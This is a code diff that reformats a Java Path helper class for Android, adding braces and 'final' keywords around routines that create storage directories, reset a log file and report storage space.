@@ -34,8 +34,8 @@ public class Path {
 
 	/** The Constant LOG_DIR. */
 	private static final String LOG_DIR = "ldd/";
-	
-	public  static final String LOG_FILE = "logs.txt";
+
+	public static final String LOG_FILE = "logs.txt";
 
 	/** The hidden. */
 	private static String hidden;
@@ -67,13 +67,15 @@ public class Path {
 		try {
 			if (haveStorage()) {
 
-				if(Cfg.DEBUG) Check.log( TAG + " (makeDirs): hidden = " + hidden());
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (makeDirs): hidden = " + hidden());
+				}
 				createDirectory(conf());
 				createDirectory(markup());
 				createDirectory(logs());
-				
-				if(Cfg.FILE){
-					File file = new File(logs(),LOG_FILE);
+
+				if (Cfg.FILE) {
+					final File file = new File(logs(), LOG_FILE);
 					file.delete();
 					file.createNewFile();
 				}
@@ -81,7 +83,9 @@ public class Path {
 				return true;
 			}
 		} catch (final Exception e) {
-			if(Cfg.DEBUG) Check.log( TAG + " Error: " + e.toString());
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Error: " + e.toString());
+			}
 		}
 		return false;
 	}
@@ -176,15 +180,17 @@ public class Path {
 	 */
 	public static long freeSpace() {
 		if (haveStorage()) {
-			StatFs stat = new StatFs(Environment.getExternalStorageDirectory()
-					.getPath());
-			long bytesAvailable = (long) stat.getBlockSize()
-					* (long) stat.getBlockCount();
-			long megAvailable = bytesAvailable / 1048576;
-			if(Cfg.DEBUG) Check.log( TAG + " (freeSpace): " + megAvailable + " MiB");
+			final StatFs stat = new StatFs(Environment.getExternalStorageDirectory().getPath());
+			final long bytesAvailable = (long) stat.getBlockSize() * (long) stat.getBlockCount();
+			final long megAvailable = bytesAvailable / 1048576;
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (freeSpace): " + megAvailable + " MiB");
+			}
 			return bytesAvailable;
 		} else {
-			if(Cfg.DEBUG) Check.log( TAG + " (freeSpace) Error: no external path");
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (freeSpace) Error: no external path");
+			}
 			return 0;
 		}
 	}
